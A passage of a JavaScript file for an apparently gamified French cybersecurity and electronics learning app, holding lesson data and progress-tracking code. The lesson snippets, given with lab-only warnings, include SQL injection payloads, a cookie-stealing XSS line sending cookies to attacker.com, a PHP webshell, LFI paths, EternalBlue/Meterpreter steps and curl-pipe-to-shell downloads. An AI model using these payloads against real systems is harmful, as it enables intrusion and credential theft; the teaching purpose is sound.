"u": "https://www.cisco.com/"}]}]}, {"id": "systemes", "name": "LINUX TEMPLE", "icon": "💻", "color": "#a855f7", "glow": "rgba(168,85,247,.05)", "desc": "Linux, Kali, Windows Server, VMs · S3-S18", "weeks": [{"n": 1, "title": "Linux navigation", "sub": "Arborescence et commandes de base", "topics": ["Arborescence Linux : /, /etc, /home, /var", "pwd, ls -la, cd, mkdir, rmdir", "cp, mv, rm, touch, cat, less", "find, grep, locate"], "code": "pwd\nls -la\ncd /etc && ls\ncd ~\n\n# Chercher :\nfind / -name '*.conf' 2>/dev/null\ngrep -r 'password' /etc/ 2>/dev/null\n\n# Lire :\ncat /etc/passwd\nless /var/log/syslog", "tip": "Tab autocomplete, flèche haut = commande précédente, Ctrl+R = recherche historique.", "warn": null, "resources": [{"l": "Linux Journey", "u": "https://linuxjourney.com/"}]}, {"n": 2, "title": "Permissions Linux", "sub": "Droits et sécurité fichiers", "topics": ["Notation rwx et octale (chmod 755)", "chmod : modifier les droits", "chown et chgrp : changer propriétaire", "SUID, SGID, Sticky Bit"], "code": "# rw- = 6, r-- = 4, --- = 0\nchmod 755 script.sh\nchmod +x script.sh\nchown simon:sudo file\n\n# Chercher les SUID (vecteur privesc) :\nfind / -perm -4000 2>/dev/null\nfind / -writable -type f 2>/dev/null", "tip": null, "warn": "SUID sur un binaire root = s'exécute avec droits root. Vecteur de privesc classique en CTF.", "resources": [{"l": "THM Linux Fundamentals", "u": "https://tryhackme.com/module/linux-fundamentals"}]}, {"n": 3, "title": "Bash scripting", "sub": "Automatiser avec des scripts", "topics": ["Variables, $1 $2 $@ (arguments)", "Conditions if/then/fi", "Boucles for/while/until", "Fonctions et redirections"], "code": "#!/bin/bash\nRESEAU='192.168.1'\n\necho '[*] Scan de $RESEAU.0/24'\nfor i in $(seq 1 254); do\n    IP='$RESEAU.$i'\n    if ping -c 1 -W 1 $IP &>/dev/null; then\n        echo '[+] Hôte actif : $IP'\n    fi\ndone", "tip": "chmod +x scan.sh puis ./scan.sh. Debugger avec bash -x scan.sh.", "warn": null, "resources": [{"l": "Bash Academy", "u": "https://guide.bash.academy/"}]}, {"n": 4, "title": "VirtualBox et VMs", "sub": "Créer son lab de sécurité", "topics": ["Créer une VM Ubuntu et Kali Linux", "Modes réseau : NAT, Bridge, Host-Only, Internal", "Snapshots pour sauvegarder l'état", "Réseau Internal pour isoler le lab"], "code": "# Architecture lab pentest :\n# VM Kali    : réseau interne 'lab'\n# VM Ubuntu  : réseau interne 'lab'\n# VM Windows : réseau interne 'lab'\n\n# VBoxManage :\nvboxmanage list vms\nvboxmanage snapshot 'Kali' take 'avant'\nvboxmanage snapshot 'Kali' restore 'avant'\nvboxmanage startvm 'Ubuntu' --type headless", "tip": "Snapshot AVANT tout test = revenir propre en 10 secondes.", "warn": null, "resources": [{"l": "VirtualBox Manual", "u": "https://www.virtualbox.org/manual/"}]}, {"n": 5, "title": "Kali Linux", "sub": "Outils offensifs essentiels", "topics": ["Distribution Kali : 600+ outils", "nmap, netcat, John the Ripper, Hydra", "Gobuster pour énumérer les répertoires web", "Wordlists : rockyou.txt"], "code": "# nmap :\nnmap -sV 192.168.1.1\nnmap -sS -p- target\nnmap -sC -sV -oN scan.txt tgt\n\n# Netcat :\nnc -lvp 4444\nnc 192.168.1.100 4444\n\n# Gobuster :\ngobuster dir -u http://target -w common.txt\n\n# John :\njohn --wordlist=rockyou.txt hash.txt", "tip": null, "warn": "Ces outils sont légaux uniquement sur des systèmes autorisés ou dans un lab VM isolé.", "resources": [{"l": "Kali Docs", "u": "https://www.kali.org/docs/"}]}, {"n": 6, "title": "Windows Server", "sub": "Active Directory et administration", "topics": ["Active Directory : domaine, OU, utilisateurs", "Créer et gérer des utilisateurs AD", "GPO (Group Policy Objects)", "PowerShell : Get-ADUser, Get-Process"], "code": "# PowerShell AD :\nGet-ADUser -Filter *\nNew-ADUser -Name 'Simon Jutge' -SamAccountName 'sjutge'\nAdd-ADGroupMember -Identity 'Admins' -Members 'sjutge'\n\n# Système :\nGet-ComputerInfo | Select OsName,OsVersion\nGet-Service | Where Status -eq 'Running'\n\n# Logs connexion :\nGet-EventLog -LogName Security -InstanceId 4624 -Newest 20", "tip": "Event ID 4624=connexion OK, 4625=échec. Premiers réflexes en investigation.", "warn": null, "resources": [{"l": "Microsoft Learn AD", "u": "https://learn.microsoft.com/fr-fr/windows-server/identity/ad-ds/"}]}, {"n": 7, "title": "Logs et forensics", "sub": "Analyser les traces d'activité", "topics": ["Logs Linux : /var/log/auth.log, syslog", "Détecter un brute-force SSH", "Windows Event Viewer : Security, System", "Lynis audit de sécurité Linux"], "code": "# Brute-force SSH dans les logs :\ngrep 'Failed password' /var/log/auth.log \\\n  | awk '{print $11}' \\\n  | sort | uniq -c | sort -rn | head -20\n\n# journalctl :\njournalctl -u ssh --since '1 hour ago'\njournalctl -p err -b\n\n# Lynis :\napt install lynis && lynis audit system", "tip": "fail2ban bloque automatiquement les IPs après X échecs SSH.", "warn": null, "resources": [{"l": "Lynis", "u": "https://cisofy.com/lynis/"}]}, {"n": 8, "title": "Lab pentest complet", "sub": "Infrastructure de test intégrée", "topics": ["Lab : Kali + Ubuntu cible + Windows", "Réseau Internal VirtualBox isolé", "Documenter l'archi avec draw.io", "Premier test d'intrusion guidé"], "code": "# Architecture du lab :\n# [Kali Linux]         [Ubuntu 22.04]\n# 192.168.56.10 <---> 192.168.56.20\n#        |\n# [Windows Server]\n# 192.168.56.30\n#\n# Réseau Internal VirtualBox 'pentest-lab'\n# Complètement isolé de ton réseau réel !", "tip": "Write-up de chaque test en Markdown sur GitHub = portfolio pour l'alternance.", "warn": null, "resources": [{"l": "THM Basic Pentesting", "u": "https://tryhackme.com/room/basicpentestingjt"}]}]}, {"id": "thm", "name": "TRYHACKME ARENA", "icon": "🔐", "color": "#ff3b3b", "glow": "rgba(255,59,59,.05)", "desc": "OSINT, Web, Exploit, CTF · S9-S24", "weeks": [{"n": 1, "title": "OSINT et reconnaissance", "sub": "Collecte passive d'informations", "topics": ["OSINT : sources publiques légalement accessibles", "Google Dorking : site:, filetype:, intitle:", "Shodan : inventorier les appareils exposés", "theHarvester, WHOIS, Subfinder"], "code": "# Google Dorks :\nsite:exemple.fr filetype:pdf\nintitle:'index of' 'backup'\ninurl:admin\n\n# theHarvester :\ntheHarvester -d exemple.fr -b all\n\n# Sous-domaines :\nsubfinder -d exemple.fr\namass enum -d exemple.fr\n\n# WHOIS :\nwhois exemple.fr", "tip": "Shodan : chercher 'default password' + marque routeur = routeurs avec identifiants usine.", "warn": null, "resources": [{"l": "THM OHSINT", "u": "https://tryhackme.com/room/ohsint"}]}, {"n": 2, "title": "Nmap avancé", "sub": "Reconnaissance active", "topics": ["Options : -sV, -sS, -sU, -A, -p-", "NSE (Nmap Scripting Engine) --script", "Détection d'OS avec -O", "Contourner les firewalls : -f, --source-port"], "code": "# Scan complet standard :\nnmap -sC -sV -oN recon.txt 192.168.1.1\n\n# Tous les ports :\nnmap -p- -T4 192.168.1.1\n\n# Scripts NSE :\nnmap --script vuln 192.168.1.1\nnmap --script http-enum target\nnmap --script smb-vuln* target\n\n# Scan rapide du réseau :\nnmap -T4 --open 192.168.1.0/24", "tip": "Commencer par un scan rapide (-T4 top 1000 ports) puis approfondir les services.", "warn": null, "resources": [{"l": "Nmap Reference", "u": "https://nmap.org/book/man.html"}]}, {"n": 3, "title": "Burp Suite", "sub": "Proxy d'interception web", "topics": ["Configurer Burp comme proxy (127.0.0.1:8080)", "Intercepter et modifier des requêtes HTTP", "Repeater : rejouer et modifier", "Intruder : attaques par dictionnaire"], "code": "# Workflow Burp Suite :\n# 1. Proxy > Options > Bind 127.0.0.1:8080\n# 2. Navigateur > Proxy manuel 127.0.0.1:8080\n# 3. Proxy > Intercept > ON\n\n# Dans Repeater - modifier :\n# Cookie: session=abc -> session=admin\n# X-Forwarded-For: 127.0.0.1\n\n# Intruder brute-force login :\n# Marquer les champs\n# Charger wordlist -> Start Attack", "tip": "PortSwigger Web Security Academy (gratuit) = le meilleur cours web hacking.", "warn": null, "resources": [{"l": "PortSwigger Academy", "u": "https://portswigger.net/web-security"}]}, {"n": 4, "title": "SQL Injection", "sub": "Exploiter les bases de données", "topics": ["Injection SQL : concaténation non sécurisée", "Bypass authentification OR 1=1", "UNION SELECT pour exfiltrer des données", "sqlmap pour automatiser la détection"], "code": "-- Payloads classiques :\nOR 1=1 --\nOR '1'='1\nadmin'--\n\n-- UNION pour lire la BDD :\nUNION SELECT null,table_name,null\n  FROM information_schema.tables--\n\n-- sqlmap :\nsqlmap -u 'http://target/?id=1' --dbs\nsqlmap -u 'http://target/?id=1' -D db --tables", "tip": null, "warn": "SQLi = crime si pratiqué sans autorisation. DVWA, THM, HackTheBox uniquement.", "resources": [{"l": "DVWA Lab", "u": "https://github.com/digininja/DVWA"}]}, {"n": 5, "title": "XSS", "sub": "Cross-Site Scripting", "topics": ["XSS réfléchi vs stocké vs DOM-based", "Payloads basiques et bypass de filtres", "Vol de cookies de session", "Protection : htmlspecialchars, CSP headers"], "code": "-- XSS basique (dans un champ commentaire) :\nalert(document.cookie)\n\n-- Via attribut image :\nonerror=alert(1)\n\n-- Vol de cookie (javascript) :\nnew Image().src='https://attacker.com/?c='+document.cookie\n\n-- Protection PHP :\nhtmlspecialchars($input, ENT_QUOTES, 'UTF-8')\n\n-- CSP Header :\nContent-Security-Policy: default-src 'self'", "tip": "XSS stocké sur un forum = tous les visiteurs exécutent le code.", "warn": null, "resources": [{"l": "PortSwigger XSS", "u": "https://portswigger.net/web-security/cross-site-scripting"}]}, {"n": 6, "title": "LFI et File Upload", "sub": "Inclusions et uploads malveillants", "topics": ["LFI : lire des fichiers serveur", "Traversée de répertoires ../../../", "File Upload Bypass : extension, MIME", "Gobuster pour découvrir les répertoires"], "code": "# LFI :\nhttp://target/page.php?file=../../../etc/passwd\nhttp://target/page.php?file=....//etc/shadow\n\n# PHP webshell basique (texte) :\nPHP system($GET[cmd])\n# Appel : /uploads/shell.php?cmd=id\n\n# Gobuster :\ngobuster dir -u http://target \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -x php,txt,html", "tip": null, "warn": "Ne jamais tester ces techniques sur des sites réels. DVWA et THM uniquement.", "resources": [{"l": "THM File Inclusion", "u": "https://tryhackme.com/room/fileinc"}]}, {"n": 7, "title": "Metasploit", "sub": "Framework d'exploitation", "topics": ["Architecture : exploit, payload, auxiliary", "msfconsole : search, use, show options, run", "msfvenom : générer des payloads", "Meterpreter : shell interactif"], "code": "msfconsole\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> show options\nmsf> set RHOSTS 192.168.1.100\nmsf> set LHOST 192.168.1.10\nmsf> run\n\n# Meterpreter :\nmeterpreter> sysinfo\nmeterpreter> getuid\nmeterpreter> hashdump\nmeterpreter> shell", "tip": null, "warn": "EternalBlue est un exploit réel (WannaCry). Uniquement sur des VMs en lab isolé.", "resources": [{"l": "THM Metasploit", "u": "https://tryhackme.com/room/metasploitintro"}]}, {"n": 8, "title": "Privilege Escalation Linux", "sub": "Obtenir les droits root", "topics": ["whoami, id, sudo -l, uname -a", "SUID dangereux : find / -perm -4000", "Cron jobs writables", "LinPEAS pour automatiser l'énumération"], "code": "# Enumération :\nwhoami && id\nsudo -l\ncat /etc/crontab\nfind / -perm -4000 2>/dev/null\n\n# LinPEAS :\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Vecteurs classiques :\n# sudo vim -> :!/bin/bash -> root\n# SUID cp -> écraser /etc/passwd", "tip": "GTFObins.github.io liste tous les binaires Linux exploitables.", "warn": null, "resources": [{"l": "GTFObins", "u": "https://gtfobins.github.io/"}]}, {"n": 9, "title": "Privilege Escalation Windows", "sub": "Escalade sur Windows", "topics": ["whoami /priv, whoami /groups, systeminfo", "Services mal configurés", "AlwaysInstallElevated", "WinPEAS pour automatiser"], "code": "REM Enumération Windows :\nwhoami /priv\nwhoami /groups\nsysteminfo\nnet localgroup administrators\nwmic service get name,startname,pathname\n\nREM WinPEAS PowerShell :\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')", "tip": "SeImpersonatePrivilege = potentiellement exploitable avec PrintSpoofer ou JuicyPotato.", "warn": null, "resources": [{"l": "THM Windows PrivEsc", "u": "https://tryhackme.com/room/windows10privesc"}]}, {"n": 10, "title": "CTF Machines complètes", "sub": "Méthodologie de bout en bout", "topics": ["Recon, Enum, Exploit, PrivEsc, Flag", "Identifier le vecteur d'entrée", "Obtenir un shell et le stabiliser", "Write-up pendant la résolution"], "code": "# Méthodologie CTF :\n# 1. RECON\nnmap -sC -sV -oN recon.txt $TARGET\n\n# 2. ENUM\ngobuster dir -u http://$TARGET -w common.txt\n\n# 3. SHELL STABLE\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n\n# 4. PRIVESC\nsudo -l && linpeas.sh", "tip": "Rooms THM gratuites : Basic Pentesting, Bounty Hacker, Pickle Rick, Agent Sudo.", "warn": null, "resources": [{"l": "THM", "u": "https://tryhackme.com/"}]}, {"n": 11, "title": "JWT et sessions web", "sub": "Sécurité des tokens d'authentification", "topics": ["JWT structure : header.payload.signature", "Attaque alg:none", "Faible secret : cracker avec hashcat", "Cookies : httpOnly, Secure, SameSite"], "code": "# Décoder un JWT :\necho 'eyJhbGciOiJIUzI1NiJ9' | base64 -d\n# -> {alg: HS256}\n\n# Attaque alg:none (Python) :\nimport jwt\ntoken = jwt.encode({'user':'admin'},'',algorithm='none')\n\n# Cracker un JWT avec hashcat :\nhashcat -a 0 -m 16500 token.txt rockyou.txt", "tip": "jwt.io permet de décoder et modifier un JWT en ligne.", "warn": null, "resources": [{"l": "PortSwigger JWT", "u": "https://portswigger.net/web-security/jwt"}]}, {"n": 12, "title": "HackTheBox Easy machines", "sub": "Niveau supérieur", "topics": ["Différences THM vs HackTheBox", "Enumération SMB et FTP anonyme", "Exploitation de services mal configurés", "Write-ups sur GitHub Pages"], "code": "# SMB enumération :\nsmbclient -L //192.168.1.100/ -N\nsmbclient //192.168.1.100/partage -N\nenum4linux -a 192.168.1.100\n\n# FTP anonyme :\nftp 192.168.1.100\n> anonymous\n> (vide)\n> ls -la && get fichier.txt\n\n# SSH clé privée :\nchmod 600 id_rsa\nssh -i id_rsa user@192.168.1.100", "tip": "HackTheBox Starting Point = machines guidées parfaites pour débuter après THM.", "warn": null, "resources": [{"l": "HackTheBox", "u": "https://www.hackthebox.com/"}]}]}, {"id": "rootme", "name": "ROOTME CITADEL", "icon": "🏴", "color": "#39ff14", "glow": "rgba(57,255,20,.05)", "desc": "Crypto, Forensics, Pwn, CTF · S17-S36", "weeks": [{"n": 1, "title": "Encodages classiques", "sub": "Base64, Hex, ROT13", "topics": ["Base64 : encoder/décoder, identifier le padding", "Hexadécimal : octets vers notation 0-9 A-F", "ROT13 : décalage 13, appliquer 2x = original", "CyberChef pour automatiser"], "code": "import base64, codecs\n\n# Base64\nenc = base64.b64encode(b'Simon').decode()\ndec = base64.b64decode('U2ltb24=').decode()\n\n# Hex\nhex_s = b'Simon'.hex()  # '53696d6f6e'\nbytes_s = bytes.fromhex('53696d6f6e')\n\n# ROT13\nrot = codecs.encode('Hello World','rot_13')", "tip": "Sur RootMe, 80% des challenges débutants utilisent Base64, Hex ou ROT.", "warn": null, "resources": [{"l": "CyberChef", "u": "https://gchq.github.io/CyberChef/"}]}, {"n": 2, "title": "Chiffres classiques", "sub": "César, Vigenère, substitution", "topics": ["César : décalage de 1 à 25, brute-force trivial", "Vigenère : clé répétée, attaque Kasiski", "Substitution monoalphabétique", "Analyse de fréquences : e, a, s, i, t"], "code": "def cesar_brute(texte):\n    for d in range(26):\n        r = ''\n        for c in texte:\n            if c.isalpha():\n                b = ord('A') if c.isupper() else ord('a')\n                r += chr((ord(c)-b-d)%26+b)\n            else: r += c\n        print(f'{d:2d}: {r}')\n\ncesar_brute('Khoor Zruog')\n# Décalage 3 : Hello World", "tip": "dcode.fr est la référence CTF pour tous les chiffres classiques.", "warn": null, "resources": [{"l": "dcode.fr", "u": "https://www.dcode.fr/"}]}, {"n": 3, "title": "RSA et hashes", "sub": "Cryptographie asymétrique", "topics": ["RSA : principe p*q=n, clé publique et privée", "Factoriser n si p et q sont proches", "Hashes : MD5 cassé, SHA1 déprécié, SHA256 standard", "Attaques : rainbow tables, dictionnaire, hashcat"], "code": "# RSA basique :\np, q = 61, 53\nn = p * q           # 3233\ne = 17\nd = pow(e,-1,(p-1)*(q-1))\n\nm = 65\nc = pow(m,e,n)      # Chiffrer : 2790\nr = pow(c,d,n)      # Déchiffrer : 65\n\n# hashcat :\nhashcat -a 0 -m 0 hash.txt rockyou.txt", "tip": "factordb.com a des millions de nombres déjà factorisés.", "warn": null, "resources": [{"l": "factordb", "u": "http://factordb.com/"}]}, {"n": 4, "title": "Stéganographie", "sub": "Cacher des données dans des médias", "topics": ["LSB (Least Significant Bit) dans les images", "steghide pour JPEG et WAV", "zsteg pour analyser les plans de bits", "ExifTool pour les métadonnées EXIF"], "code": "# Outils :\napt install steghide exiftool\n\n# steghide :\nsteghide embed -cf photo.jpg -sf secret.txt -p 'mdp'\nsteghide extract -sf photo.jpg -p 'mdp'\nsteghide info photo.jpg\n\n# ExifTool :\nexiftool photo.jpg\n\n# Chercher du texte caché :\nstrings image.png | grep -i 'flag'", "tip": "AperiSolve lance automatiquement tous les outils stégano en ligne.", "warn": null, "resources": [{"l": "AperiSolve", "u": "https://www.aperisolve.com/"}]}, {"n": 5, "title": "Forensics fichiers", "sub": "Analyser des fichiers suspects", "topics": ["Magic bytes : identifier le vrai type de fichier", "binwalk : détecter et extraire des fichiers imbriqués", "foremost : récupérer depuis image disque", "tshark : analyser captures pcap en CLI"], "code": "# Magic bytes courants :\n# PNG  : 89 50 4E 47\n# JPEG : FF D8 FF\n# ZIP  : 50 4B 03 04\n# ELF  : 7F 45 4C 46\n# PDF  : 25 50 44 46\n\n# Commandes :\nfile suspect.png\nxxd suspect.png | head\nstrings suspect\nbinwalk -e suspect.png\nforemost -i disk.img -o output/", "tip": "binwalk -e détecte et extrait automatiquement les fichiers cachés.", "warn": null, "resources": [{"l": "AperiSolve", "u": "https://www.aperisolve.com/"}]}, {"n": 6, "title": "Forensics mémoire", "sub": "Volatility 3 et dumps RAM", "topics": ["Volatility 3 : analyser dumps Windows/Linux", "Plugins : windows.pslist, windows.netscan", "Extraire processus, connexions, hashs NTLM", "Créer un dump depuis VirtualBox"], "code": "# Installer :\npip install volatility3\n\n# Analyser :\nvol -f memory.dmp windows.info\nvol -f memory.dmp windows.pslist\nvol -f memory.dmp windows.netscan\nvol -f memory.dmp windows.cmdline\nvol -f memory.dmp windows.hashdump\nvol -f memory.dmp windows.malfind\n\n# Dump VirtualBox :\nvboxmanage debugvm 'NomVM' dumpvmcore --filename memory.elf", "tip": "windows.malfind cherche du code injecté dans des processus.", "warn": null, "resources": [{"l": "Volatility3 Docs", "u": "https://volatility3.readthedocs.io/"}]}, {"n": 7, "title": "pwntools et buffer overflow", "sub": "Exploitation de binaires", "topics": ["pwntools : bibliothèque Python pour le pwn", "Chercher l'offset du buffer overflow", "ret2win : écraser l'adresse de retour", "checksec : vérifier les protections d'un binaire"], "code": "from pwn import *\n\n# Connexion :\np = process('./vuln')\np = remote('ctf.exemple.com', 1337)\n\n# Trouver l'offset :\np.sendline(cyclic(200))\ncore = p.corefile\noffset = cyclic_find(core.read(core.rsp, 4))\n\n# ret2win :\nbinary = ELF('./vuln')\nwin = binary.symbols['win']\npayload = b'A' * offset + p64(win)\np.sendline(payload)\np.interactive()", "tip": "picoCTF a des challenges buffer overflow guidés pour débutants.", "warn": null, "resources": [{"l": "pwntools docs", "u": "https://docs.pwntools.com/"}]}, {"n": 8, "title": "CTF compétitif", "sub": "Compétitions et write-ups", "topics": ["CTFtime.org : agenda mondial des CTF", "Catégories : web, crypto, forensics, pwn, reverse", "Organiser une équipe et les rôles", "Structure d'un write-up professionnel"], "code": "# Workflow CTF en équipe :\n# 1. Lire TOUS les challenges\n# 2. Trier : facile + fort score en premier\n# 3. Répartir par spécialités :\n#    web      : Burp Suite, SQLi, XSS\n#    crypto   : CyberChef, Python\n#    forensics: Volatility, binwalk\n#    pwn      : pwntools, gdb, checksec\n# 4. Espace partagé : HackMD ou Notion\n# 5. Write-up PENDANT la résolution", "tip": "picoCTF est permanent et adapté aux lycéens.", "warn": null, "resources": [{"l": "CTFtime", "u": "https://ctftime.org/"}, {"l": "picoCTF", "u": "https://picoctf.org/"}]}]}, {"id": "elec", "name": "ELECTRONICS LAB", "icon": "🔌", "color": "#00979d", "glow": "rgba(0,151,157,.05)", "desc": "Arduino, Raspberry Pi, IoT · S1-S52", "weeks": [{"n": 1, "title": "Arduino premier sketch", "sub": "LED, Serial, bases", "topics": ["Structure : setup() 1x, loop() en boucle", "pinMode, digitalWrite, digitalRead, analogRead", "Moniteur série : Serial.begin() et println()", "Types en C++ Arduino : int, float, bool, String"], "code": "const int LED = 13;\nconst int BTN = 7;\n\nvoid setup() {\n  pinMode(LED, OUTPUT);\n  pinMode(BTN, INPUT_PULLUP);\n  Serial.begin(9600);\n  Serial.println('Arduino pret !');\n}\n\nvoid loop() {\n  if (digitalRead(BTN) == LOW) {\n    digitalWrite(LED, HIGH);\n    Serial.println('Bouton presse !');\n  } else {\n    digitalWrite(LED, LOW);\n  }\n  delay(50);\n}", "tip": "Serial.print() sans retour à la ligne, Serial.println() avec.", "warn": null, "resources": [{"l": "Arduino Reference", "u": "https://www.arduino.cc/reference/fr/"}]}, {"n": 2, "title": "Capteurs et actionneurs", "sub": "DHT11, ultrason, servo, LCD", "topics": ["DHT11 : mesurer température et humidité", "HC-SR04 : mesurer une distance par ultrason", "Servo SG90 : contrôle d'angle précis", "LCD I2C 16x2 : afficher des données"], "code": "#include DHT.h\n#include Servo.h\n\nDHT dht(2, DHT11);\nServo myServo;\n\nvoid setup() {\n  dht.begin();\n  myServo.attach(9);\n  Serial.begin(9600);\n}\n\nvoid loop() {\n  float temp = dht.readTemperature();\n  Serial.print(temp);\n  Serial.println('C');\n  myServo.write(map(temp, 15, 35, 0, 180));\n  delay(2000);\n}", "tip": "I2C utilise seulement 2 fils (SDA+SCL) pour connecter plusieurs périphériques.", "warn": null, "resources": [{"l": "Arduino Libraries", "u": "https://www.arduino.cc/reference/en/libraries/"}]}, {"n": 3, "title": "Protocoles embarqués", "sub": "UART, I2C, SPI", "topics": ["UART : communication série asynchrone", "I2C : bus 2 fils, adresses 7 bits", "SPI : 4 fils, plus rapide, full-duplex", "Déboguer avec un analyseur logique"], "code": "// UART Arduino vers Raspberry Pi\n// Arduino (émetteur) :\nvoid setup() { Serial.begin(9600); }\nvoid loop() {\n  Serial.println('temp:23.5,hum:55.2');\n  delay(2000);\n}\n\n// Raspberry Pi (récepteur Python) :\nimport serial\nser = serial.Serial('/dev/ttyUSB0', 9600)\nwhile True:\n    line = ser.readline().decode().strip()\n    print(f'Recu : {line}')", "tip": "Un analyseur logique (~10 euros) affiche les signaux UART/I2C/SPI.", "warn": null, "resources": [{"l": "I2C Bus", "u": "https://www.i2c-bus.org/"}]}, {"n": 4, "title": "Raspberry Pi", "sub": "Linux embarqué et GPIO", "topics": ["Installer Raspberry Pi OS avec RPi Imager", "SSH depuis PC sans écran (headless)", "GPIO en Python : RPi.GPIO ou gpiozero", "Serveur web minimal avec Flask sur le Pi"], "code": "import RPi.GPIO as GPIO\nimport time\n\nLED = 18\nGPIO.setmode(GPIO.BCM)\nGPIO.setup(LED, GPIO.OUT)\n\ntry:\n    while True:\n        GPIO.output(LED, True)\n        print('LED ON')\n        time.sleep(1)\n        GPIO.output(LED, False)\n        print('LED OFF')\n        time.sleep(1)\nfinally:\n    GPIO.cleanup()", "tip": "RPi Imager configure Wi-Fi et SSH avant insertion de la carte SD.", "warn": null, "resources": [{"l": "RPi Docs", "u": "https://www.raspberrypi.com/documentation/"}]}, {"n": 5, "title": "Serveur Flask et IoT", "sub": "Dashboard capteurs en temps réel", "topics": ["Flask : routes, templates, jsonify", "Données capteurs vers API REST", "Chart.js pour les visualisations", "Stocker les données en SQLite"], "code": "from flask import Flask, jsonify\nimport random\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Dashboard IoT'\n\n@app.route('/api')\ndef api():\n    return jsonify(\n        temp=round(random.uniform(18,28),1),\n        hum=round(random.uniform(40,70),1)\n    )\n\napp.run(host='0.0.0.0',port=5000)", "tip": "0.0.0.0 rend Flask accessible depuis tout le réseau local.", "warn": null, "resources": [{"l": "Flask Docs", "u": "https://flask.palletsprojects.com/"}]}, {"n": 6, "title": "Sécurité IoT", "sub": "Analyser les objets connectés", "topics": ["Inventorier les appareils IoT avec nmap", "Capturer le trafic d'un objet (Wireshark)", "MQTT : protocole IoT souvent non chiffré", "Firmware analysis avec binwalk"], "code": "# Scanner les IoT du réseau :\nnmap -sV --script banner 192.168.1.0/24\n\n# MQTT - écouter tous les topics :\npip install paho-mqtt\nimport paho.mqtt.client as mqtt\n\nclient = mqtt.Client()\nclient.connect('broker.hivemq.com', 1883)\nclient.subscribe('#')\n\ndef on_message(c, u, msg):\n    print(f'{msg.topic}: {msg.payload.decode()}')\n\nclient.on_message = on_message\nclient.loop_forever()", "tip": null, "warn": "Des milliers de brokers MQTT publics exposent des données sans authentification.", "resources": [{"l": "OWASP IoT Top 10", "u": "https://owasp.org/www-project-internet-of-things/"}]}, {"n": 7, "title": "Projet IoT Sécurisé", "sub": "Dashboard avec authentification", "topics": ["flask-login : gestion des sessions", "HTTPS avec certificat auto-signé", "SQLite pour stocker l'historique", "Alertes Telegram si seuil dépassé"], "code": "# Générer un certificat auto-signé :\nopenssl req -x509 -newkey rsa:4096 \\\n  -keyout key.pem -out cert.pem \\\n  -days 365 -nodes\n\n# Flask avec HTTPS :\napp.run(host='0.0.0.0', port=443,\n        ssl_context=('cert.pem','key.pem'))\n\n# SQLite :\nimport sqlite3\nconn = sqlite3.connect('data.db')\nconn.execute('CREATE TABLE IF NOT EXISTS mesures (id INTEGER PRIMARY KEY, temp REAL, hum REAL)')\nconn.commit()", "tip": "Ce projet (IoT + sécurité + web + BDD) est un excellent projet STI2D ET portfolio.", "warn": null, "resources": [{"l": "Flask-Login", "u": "https://flask-login.readthedocs.io/"}]}, {"n": 8, "title": "Système Arduino + Pi", "sub": "Projet SIN intégré complet", "topics": ["Arduino vers Pi via UART : envoi données capteurs", "Pi stocke en SQLite, sert le dashboard Flask", "Schéma électronique complet avec Fritzing", "Documentation technique du projet"], "code": "# Pi - lecture UART depuis Arduino :\nimport serial, sqlite3\n\nser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)\nconn = sqlite3.connect('capteurs.db')\n\nwhile True:\n    try:\n        line = ser.readline().decode().strip()\n        if ',' in line:\n            temp, hum = line.split(',')\n            conn.execute(\n              'INSERT INTO mesures(temp,hum) VALUES(?,?)',\n              (float(temp), float(hum))\n            )\n            conn.commit()\n            print(f'T={temp}C H={hum}%')\n    except Exception as e:\n        print(f'Erreur: {e}')", "tip": "Ce projet est un candidat idéal pour le rapport STI2D et le dossier alternance.", "warn": null, "resources": [{"l": "Fritzing", "u": "https://fritzing.org/"}]}]}];
+
+
+var SAVE='cq6';
+var LEVELS=[
+  {name:'Script Kiddie',icon:'🐣',min:0},
+  {name:'Apprenti',icon:'🔍',min:300},
+  {name:'Analyste Jr',icon:'🔎',min:800},
+  {name:'Hacker Jr',icon:'🛡️',min:1800},
+  {name:'Pentester',icon:'💻',min:3500},
+  {name:'Exploit Dev',icon:'⚡',min:6000},
+  {name:'Red Teamer',icon:'🔴',min:9500},
+  {name:'Elite Operator',icon:'🏴',min:14000}
+];
+
+var state={done:{},coursRead:{},apiKey:'',streak:0,lastActive:null,streakDays:[]};
+var curZone=null,curWeek=null;
+var qAns=[],qOk=[];
+
+function load(){
+  try{
+    var r=localStorage.getItem(SAVE);
+    if(r)Object.assign(state,JSON.parse(r));
+    // Fallback: load apiKey separately in case main state failed
+    var k=localStorage.getItem(SAVE+'_key');
+    if(k&&!state.apiKey)state.apiKey=k;
+  }catch(e){}
+}
+function save(){
+  try{
+    localStorage.setItem(SAVE,JSON.stringify(state));
+    // Also save apiKey separately as backup
+    if(state.apiKey)localStorage.setItem(SAVE+'_key',state.apiKey);
+  }catch(e){}
+}
+function el(id){return document.getElementById(id);}
+function showScreen(id){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});el(id).classList.add('active');}
+
+function showApiModal(){el('apiinput').value=state.apiKey||'';el('apimodal').classList.add('show');}
+function closeApiModal(){el('apimodal').classList.remove('show');}
+function saveKey(){var k=el('apiinput').value.trim();if(!k){toast('Clé vide !');return;}state.apiKey=k;save();closeApiModal();updateApiBtn();toast('Clé API sauvegardée !');}
+function updateApiBtn(){var b=el('apibtn');if(state.apiKey&&state.apiKey.length>10){b.textContent='API OK';b.classList.add('ok');}else{b.textContent='🔑 API';b.classList.remove('ok');}}
+function showReset(){el('rmodal').classList.add('show');}
+function closeReset(){el('rmodal').classList.remove('show');}
+function doReset(){localStorage.removeItem(SAVE);state={done:{},coursRead:{},apiKey:'',streak:0,lastActive:null,streakDays:[]};closeReset();updateApiBtn();goMap();toast('Progression réinitialisée !');}
+
+function checkStreak(){
+  var today=new Date().toISOString().split('T')[0];
+  if(state.lastActive===today)return;
+  if(state.lastActive){
+    var diff=(new Date(today)-new Date(state.lastActive))/86400000;
+    state.streak=diff<=1?(state.streak||0)+1:1;
+    if(diff>1)state.streakDays=[];
